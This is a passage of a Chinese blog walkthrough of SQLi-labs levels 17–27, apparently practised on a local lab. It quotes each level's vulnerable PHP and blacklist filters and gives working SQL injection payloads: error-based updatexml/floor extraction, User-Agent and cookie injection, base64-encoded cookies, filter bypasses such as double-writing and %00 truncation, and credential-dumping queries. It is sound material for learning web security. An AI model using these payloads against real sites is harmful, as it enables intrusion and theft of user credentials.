<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update sql_4 SET name=&#x27;Dick&#x27; where (select 1,count(*),concat((select database()),floor(rand(0)*2))x from information_schema.schemata group by x);</span><br></pre></td></tr></table></figure>

<p>因为count(*)和concat的内容最少也需要两列</p>
</li>
</ol>
<h3 id="有趣的发现3"><a href="#有趣的发现3" class="headerlink" title="有趣的发现3"></a>有趣的发现3</h3><blockquote>
<p><img src="/2023/06/26/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/17_6.png" alt="17_6"></p>
<p>这里用数字就可以，用字母就不可以，我也不晓得为什么</p>
</blockquote>
<h3 id="遗留疑惑2【见有趣的发现3】"><a href="#遗留疑惑2【见有趣的发现3】" class="headerlink" title="遗留疑惑2【见有趣的发现3】"></a>遗留疑惑2【见有趣的发现3】</h3><p>于是我们就可以开始构造payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&amp;passwd=1&#x27; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),0x7e),1) #</span><br><span class="line">或者</span><br><span class="line">uname=admin&amp;passwd=1&#x27; and (select 1 from (select count(*),concat((select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),floor(rand(0)*2))x from information_schema.schemata group by x)a)#</span><br></pre></td></tr></table></figure>

<p>但是当我们构造</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&amp;passwd=1&#x27; and updatexml(1,concat(0x7e,(select group_concat(password) from security.users),0x7e),1) #</span><br></pre></td></tr></table></figure>

<p>会报错：</p>
<p><img src="/2023/06/26/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/17_7.png" alt="17_7"></p>
<p>测试里同样出现了这种问题：【后来发现只是我前面做update题时把他全改成xxx了，不是加密。。。想多了】</p>
<p><img src="/2023/06/26/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/17_8.png" alt="17_8"></p>
<p>我们试着多构造一层【记得取别名！！！】</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&amp;passwd=1&#x27; and updatexml(1,concat(0x7e,(select username from (select username from users limit 0,1)a),0x7e),1) #</span><br><span class="line">或者</span><br><span class="line">uname=admin&amp;passwd=1&#x27; and (select 1 from (select count(*),concat((select username from (select username from users limit 0,1)a),floor(rand(0)*2))x from information_schema.schemata group by x)a)#</span><br></pre></td></tr></table></figure>

<h3 id="遗留疑惑3"><a href="#遗留疑惑3" class="headerlink" title="遗留疑惑3"></a>遗留疑惑3</h3><blockquote>
<p><img src="/2023/06/26/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/17_9.png" alt="17_9"></p>
<p>当多构造的一层和里面一层select的对象不同的时候，会这样报错：Only constant XPATH queries are supported</p>
</blockquote>
<h2 id="No-18【http头uagent注入】"><a href="#No-18【http头uagent注入】" class="headerlink" title="No.18【http头uagent注入】"></a>No.18【http头uagent注入】</h2><p>这一关就和之前完全不一样了，首先看一下源代码，发现：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$uname = check_input($con, $_POST[&#x27;uname&#x27;]);</span><br><span class="line">$passwd = check_input($con, $_POST[&#x27;passwd&#x27;]);</span><br></pre></td></tr></table></figure>

<p>我们不可能从用户名和密码这个注入点注入了，所以继续观察发现：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$uagent = $_SERVER[&#x27;HTTP_USER_AGENT&#x27;];</span><br><span class="line">$IP = $_SERVER[&#x27;REMOTE_ADDR&#x27;];</span><br><span class="line"></span><br><span class="line">$insert=&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&#x27;$uagent&#x27;, &#x27;$IP&#x27;, $uname)&quot;;</span><br><span class="line"></span><br><span class="line">echo &#x27;Your User Agent is: &#x27; .$uagent;</span><br></pre></td></tr></table></figure>

<p><img src="/2023/06/26/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/18_1.png" alt="18_1"></p>
<p>我们用bp抓一个包试试看：</p>
<p><img src="/2023/06/26/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/18_2.png" alt="18_2"></p>
<p>我们发现，这两个东西是一样，也就是insert里的uagent，我们就想到把这个地方当作一个注入点。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&#x27;$uagent&#x27;, &#x27;$IP&#x27;, $uname)</span><br><span class="line">我们把uagent的值设为：1&#x27;,1,1)#，这句就变成了：</span><br><span class="line">INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&#x27;1&#x27;,1,1)#</span><br><span class="line">这里就是我们的注入点</span><br></pre></td></tr></table></figure>

<p>我们可以构造爆库</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agent：1&#x27;,1,updatexml(1,concat(0x7e,database(),0x7e),1))#</span><br></pre></td></tr></table></figure>

<p>爆表：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agent：1&#x27;,1,updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),0x7e),1))#</span><br></pre></td></tr></table></figure>

<p>爆字段：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agent：1&#x27;,1,updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27;),0x7e),1))#</span><br></pre></td></tr></table></figure>

<p>爆值：[变换n的值来爆不同的值]</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agent：1&#x27;,1,updatexml(1,concat(0x7e,(select concat(username,0x7e,password) from security.users limit n,1),0x7e),1))#</span><br></pre></td></tr></table></figure>

<h2 id="No-19【http头referer注入】"><a href="#No-19【http头referer注入】" class="headerlink" title="No.19【http头referer注入】"></a>No.19【http头referer注入】</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$uagent = $_SERVER[&#x27;HTTP_REFERER&#x27;];</span><br><span class="line">$IP = $_SERVER[&#x27;REMOTE_ADDR&#x27;];</span><br><span class="line"></span><br><span class="line">$insert=&quot;INSERT INTO `security`.`referers` (`referer`, `ip_address`) VALUES (&#x27;$uagent&#x27;, &#x27;$IP&#x27;)&quot;;</span><br><span class="line"></span><br><span class="line">echo &#x27;Your Referer is: &#x27; .$uagent;</span><br></pre></td></tr></table></figure>

<p><code>$uagent = $_SERVER[&#39;HTTP_REFERER&#39;];</code>这个就代表http头里的referer字段</p>
<h3 id="遗留疑惑3-1"><a href="#遗留疑惑3-1" class="headerlink" title="遗留疑惑3"></a>遗留疑惑3</h3><blockquote>
<p>这个按道理说应该是按照18关的方法，改到referer上面就可以了，网上也都是这么说的，可是本地sqllabs似乎有点问题，一直没有回显，这道题就先放着。</p>
<p><img src="/2023/06/26/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/19_1.png" alt="19_1"></p>
</blockquote>
<h2 id="No-20【cookie注入】"><a href="#No-20【cookie注入】" class="headerlink" title="No.20【cookie注入】"></a>No.20【cookie注入】</h2><p>这一关我们直接查看源代码，发现以下关键性代码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$cookee = $_COOKIE[&#x27;uname&#x27;];</span><br><span class="line"></span><br><span class="line">$sql=&quot;SELECT * FROM users WHERE username=&#x27;$cookee&#x27; LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>

<p>这样就和之前最简单的单引号注入一样了，我们直接bp改cookie：</p>
<p><img src="/2023/06/26/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/20_1.png" alt="20_1"></p>
<p>然后像No.1一样慢慢爆出来就行了。</p>
<p><img src="/2023/06/26/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/20_2.png" alt="20_2"></p>
<p>当然，布尔注入，报错注入，时间注入也都是OK的。</p>
<h2 id="No-21【base64加密】"><a href="#No-21【base64加密】" class="headerlink" title="No.21【base64加密】"></a>No.21【base64加密】</h2><p>先正常输入用户名和密码得到：</p>
<p><img src="/2023/06/26/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/21_1.png" alt="21_1"></p>
<p>其中：<code>YWRtaW4=</code>解码之后是admin，然后连上bp，发现cookie确实是这个。</p>
<p>我们就试着把注入语句通过base64加密之后放到cookie的uname里。</p>
<p>首先admin’加密后得到：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use near &#x27;&#x27;admin&#x27;&#x27;) LIMIT 0,1&#x27; at line 1</span><br><span class="line">即</span><br><span class="line">&#x27;admin&#x27;&#x27;) LIMIT 0,1</span><br></pre></td></tr></table></figure>

<p>即可发现该注入是单引号加单括号注入。</p>
<p>接着就像No.1那关一步步加密后，放到cookie里面即可。</p>
<p><img src="/2023/06/26/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/21_2.png" alt="21_2"></p>
<h2 id="No-22"><a href="#No-22" class="headerlink" title="No.22"></a>No.22</h2><p>大体上和刚才差不多。</p>
<p>admin’发现不报错，应该就是和双引号有关的注入点，一测果然就是双引号：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use near &#x27;&quot;admin&quot;&quot; LIMIT 0,1&#x27; at line 1</span><br></pre></td></tr></table></figure>

<p>还是base64加密之后放入cookie里就好了。</p>
<h2 id="No-23【过滤注释符】"><a href="#No-23【过滤注释符】" class="headerlink" title="No.23【过滤注释符】"></a>No.23【过滤注释符】</h2><p>先测试出是单引号报错，但是<code>?id=1 #</code>还是报错，推测是<code>#</code>和<code>--+</code>被过滤，一看源码果然是：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$id=$_GET[&#x27;id&#x27;];</span><br><span class="line"></span><br><span class="line">//filter the comments out so as to comments should not work</span><br><span class="line">$reg = &quot;/#/&quot;;</span><br><span class="line">$reg1 = &quot;/--/&quot;;</span><br><span class="line">$replace = &quot;&quot;;</span><br><span class="line">$id = preg_replace($reg, $replace, $id);</span><br><span class="line">$id = preg_replace($reg1, $replace, $id);</span><br><span class="line"></span><br><span class="line">$sql=&quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>

<p>既然我们无法注释消除后面的引号，那么我们就通过闭合它来完成：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and &#x27;1&#x27;=&#x27;1</span><br><span class="line">这样这条语句就变成了：</span><br><span class="line">SELECT * FROM users WHERE id=&#x27;1&#x27; and &#x27;1&#x27;=&#x27;1&#x27; LIMIT 0,1</span><br><span class="line">&#x27;1&#x27;=&#x27;1&#x27;是一条永真语句，所以对查询结果并无影响，要union什么就在and前面添加就行了。</span><br><span class="line"></span><br><span class="line">或者：</span><br><span class="line">?id=1&#x27; union select 1,2,&#x27;3</span><br><span class="line">将3闭合</span><br><span class="line">SELECT * FROM users WHERE id=&#x27;1&#x27; union select 1,2,&#x27;3&#x27; LIMIT 0,1</span><br></pre></td></tr></table></figure>

<h3 id="00截断"><a href="#00截断" class="headerlink" title="%00截断"></a>%00截断</h3><blockquote>
<p>有一些比较低版本的MySQL可以使用%00截断，类似于</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?id=-1&#x27; union select 1,database(),3; %00</span><br></pre></td></tr></table></figure>

<p>测试结果如下：</p>
<p><img src="/2023/06/26/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/23_1.png" alt="23_1"></p>
<p>发现%00截断了后面的内容，无论在后面加什么奇怪的字符，都相当于没有，；也不行：</p>
<p><img src="/2023/06/26/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/23_2.png" alt="23_2"></p>
</blockquote>
<p>接下来就像No.1一样注入就行了,但是有一点要注意一下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,group_concat(username),group_concat(password) from security.users and &#x27;1&#x27; = &#x27;1</span><br></pre></td></tr></table></figure>

<p>这样好像不太行：</p>
<p><img src="/2023/06/26/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/23_3.png" alt="23_3"></p>
<p>只能像这样</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,(select group_concat(password) from security.users ),3 and &#x27;1&#x27; = &#x27;1</span><br></pre></td></tr></table></figure>

<p><img src="/2023/06/26/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/23_4.png" alt="23_4"></p>
<p>或者用%00截断：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,group_concat(username),group_concat(password) from security.users ;%00</span><br></pre></td></tr></table></figure>

<h2 id="No-24【遗留】"><a href="#No-24【遗留】" class="headerlink" title="No.24【遗留】"></a>No.24【遗留】</h2><p>这关出了点小问题，双admin都登不上去，先放一放。</p>
<h2 id="No-25【绕and-x2F-or】"><a href="#No-25【绕and-x2F-or】" class="headerlink" title="No.25【绕and&#x2F;or】"></a>No.25【绕and&#x2F;or】</h2><p><img src="/2023/06/26/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/25_1.png" alt="25_1"></p>
<p>源代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">blacklist</span>(<span class="variable">$id</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params"><span class="variable">$id</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/or/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);            <span class="comment">//strip out OR (non case sensitive)</span></span><br><span class="line">    <span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/AND/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);        <span class="comment">//Strip out AND (non case sensitive)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$id</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这一关过滤了所有的 and 和 or，第一眼觉得问题不大，但后来发现其他一些东西也被过滤了，比如order,information_schema里面都含有or。</p>
<p>其实也很简单，就是一个双写绕过，比如and写成anandd，or写成oorr。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,group_concat(column_name),3 from infoorrmation_schema.columns where table_name=&#x27;users&#x27; aandnd table_schema=&#x27;security&#x27;--+</span><br></pre></td></tr></table></figure>

<blockquote>
<p>本关考察对or和and的过滤，一般几个思路：</p>
<ol>
<li>大小写变形Or OR oR</li>
<li>编码，hex，urlencode</li>
<li>添加注释<code>/*or*/</code>，o&#x2F;**&#x2F;r</li>
<li>and &#x3D; &amp;&amp;、or &#x3D; ||</li>
<li>重复 oorr、aandnd</li>
</ol>
</blockquote>
<h2 id="No-25a"><a href="#No-25a" class="headerlink" title="No.25a"></a>No.25a</h2><p>和No.25几乎一样，只是<code>?id=1&#39;</code>换成了<code>?id=1</code></p>
<h2 id="No-26【过滤空格和常见字符】"><a href="#No-26【过滤空格和常见字符】" class="headerlink" title="No.26【过滤空格和常见字符】"></a>No.26【过滤空格和常见字符】</h2><p><img src="/2023/06/26/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/26_1.png" alt="26_1"></p>
<p>这波过滤了空格和一系列字符，看了源码发现是：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">blacklist</span>(<span class="variable">$id</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params"><span class="variable">$id</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/or/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);            <span class="comment">//strip out OR (non case sensitive)</span></span><br><span class="line">    <span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/and/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);        <span class="comment">//Strip out AND (non case sensitive)</span></span><br><span class="line">    <span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[\/\*]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);        <span class="comment">//strip out /*</span></span><br><span class="line">    <span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[--]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);        <span class="comment">//Strip out --</span></span><br><span class="line">    <span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[#]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);            <span class="comment">//Strip out #</span></span><br><span class="line">    <span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[\s]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);        <span class="comment">//Strip out spaces</span></span><br><span class="line">    <span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[\/\\\\]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);        <span class="comment">//Strip out slashes【斜线】</span></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$id</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>鉴于正常注入字符不太好调整成无过滤字符，我们这关使用报错注入：</p>
<p>爆库</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;anandd(updatexml(1,concat(0x7e,(database()),0x7e),1))aandnd&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>

<p>爆表</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;anandd(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema)like(&#x27;security&#x27;)),0x7e),1))aandnd&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>

<p>爆字段</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;anandd(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_schema)like(&#x27;security&#x27;)anandd(table_name)like(&#x27;users&#x27;)),0x7e),1))aandnd&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>

<p>爆具体数据：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;anandd(updatexml(1,concat(0x7e,(select(group_concat(username))from(security.users)),0x7e),1))aandnd&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>

<p>但是发现数据出来的不全：</p>
<p><img src="/2023/06/26/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/26_2.png" alt="26_2"></p>
<p>这里想到用<code>limit 0,1</code>,但是发现还是有空格，那么想到加where(id&#x3D;n)，所以：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;anandd(updatexml(1,concat(0x7e,(select(group_concat(username))from(security.users)where(id=1)),0x7e),1))aandnd&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>

<h2 id="No-26a"><a href="#No-26a" class="headerlink" title="No.26a"></a>No.26a</h2><p>先测试注入点：</p>
<p><code>?id=1&#39;</code>无回显，证明此题不回显语法错误</p>
<p><code>?id=1&quot;</code>正常回显id&#x3D;1用户，证明此题是单引号为主体</p>
<blockquote>
<p>判断小括号有几种方法：</p>
<ol>
<li><code>2&#39;&amp;&amp;&#39;1&#39;=&#39;1</code></li>
</ol>
<ul>
<li><p>若查询语句为<code>where id=&#39;$id&#39;</code>，查询时是<code>where id=&#39;2&#39;&amp;&amp;&#39;1&#39;=&#39;1&#39;</code>，结果是<code>where id=&#39;2&#39;</code>，回显会是<code>id=2</code>。</p>
</li>
<li><p>若查询语句为<code>where id=(&#39;$id&#39;)</code>，查询时是<code>where id=(&#39;2&#39;&amp;&amp;&#39;1&#39;=&#39;1&#39;)</code>，MySQL 将<code>&#39;2&#39;</code>作为了 Bool 值，结果是<code>where id=(&#39;1&#39;)</code>，回显会是<code>id=1</code>。</p>
</li>
</ul>
<ol>
<li><code>1&#39;)||&#39;1&#39;=(&#39;1</code><br>若查询语句有小括号正确回显，若无小括号错误回显（无回显）</li>
</ol>
</blockquote>
<h3 id="查看被过滤字符的python脚本"><a href="#查看被过滤字符的python脚本" class="headerlink" title="查看被过滤字符的python脚本"></a>查看被过滤字符的python脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">changeToHex</span>(<span class="params">num</span>):</span><br><span class="line">    tmp = <span class="built_in">hex</span>(i).replace(<span class="string">&quot;0x&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(tmp)&lt;<span class="number">2</span>:</span><br><span class="line">        tmp = <span class="string">&#x27;0&#x27;</span> + tmp</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;%&quot;</span> + tmp</span><br><span class="line"></span><br><span class="line">req = requests.session()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">256</span>):</span><br><span class="line">    i = changeToHex(i) </span><br><span class="line">    name = urllib.parse.unquote(i)</span><br><span class="line"></span><br><span class="line">    url = <span class="string">&quot;http://localhost/Sql-labs/Less-26a/?id=&quot;</span> + i </span><br><span class="line">    res = req.get(url).text</span><br><span class="line">    start = res.find(<span class="string">&#x27;Your Input is Filtered with following result:&#x27;</span>)</span><br><span class="line">    value = res[start+<span class="number">46</span>:start+<span class="number">47</span>]</span><br><span class="line">    <span class="keyword">if</span> value!=name:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;you cannot use &quot;</span> + i + <span class="string">&quot;:&quot;</span> + name)</span><br></pre></td></tr></table></figure>

<p>这个脚本跑出来是这样：</p>
<p><img src="/2023/06/26/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/26_3.png" alt="26_3"></p>
<h3 id="代替空格的url编码"><a href="#代替空格的url编码" class="headerlink" title="代替空格的url编码"></a>代替空格的url编码</h3><blockquote>
<ul>
<li><code>%09</code> TAB 键（水平）</li>
<li><code>%0a</code> 新建一行</li>
<li><code>%0b</code> TAB 键（垂直）</li>
<li><code>%0c</code> 新的一页</li>
<li><code>%0d</code> return 功能</li>
<li><code>%a0</code> 空格</li>
</ul>
</blockquote>
<p>可以看出，除了%a0以外全部被过滤，那么我们就可以用%a0来代替空格</p>
<h3 id="遗留疑惑4"><a href="#遗留疑惑4" class="headerlink" title="遗留疑惑4"></a>遗留疑惑4</h3><p>这里windows对%a0的转义有点问题，所以按照答案做的也不能爆出字段，暂时搁置。</p>
<h2 id="No-27【过滤select和union】"><a href="#No-27【过滤select和union】" class="headerlink" title="No.27【过滤select和union】"></a>No.27【过滤select和union】</h2><p>首先测试发现是单引号注入点，然后测试发现过滤字符：</p>
<p><img src="/2023/06/26/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/27_1.png" alt="27_1"></p>
<p>测试发现可以用%0a代替空格，and也没有被过滤：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">方法一：</span><br><span class="line">?id=0&#x27;%0auniOn%0aseLect%0a1,database(),3%0aand &#x27;1&#x27;=&#x27;1            //大小写绕过select和union</span><br><span class="line"></span><br><span class="line">方法二：</span><br><span class="line">直接报错注入：</span><br><span class="line">?id=-1&#x27;and(updatexml(1,concat(0x7e,(database()),0x7e),1))and&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>

<p>看一下源码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">function blacklist($id)</span><br><span class="line">&#123;</span><br><span class="line">$id= preg_replace(&#x27;/[\/\*]/&#x27;,&quot;&quot;, $id);        //strip out /*</span><br><span class="line">$id= preg_replace(&#x27;/[--]/&#x27;,&quot;&quot;, $id);        //Strip out --.</span><br><span class="line">$id= preg_replace(&#x27;/[#]/&#x27;,&quot;&quot;, $id);            //Strip out #.</span><br><span class="line">$id= preg_replace(&#x27;/[ +]/&#x27;,&quot;&quot;, $id);        //Strip out spaces.</span><br><span class="line">$id= preg_replace(&#x27;/select/m&#x27;,&quot;&quot;, $id);        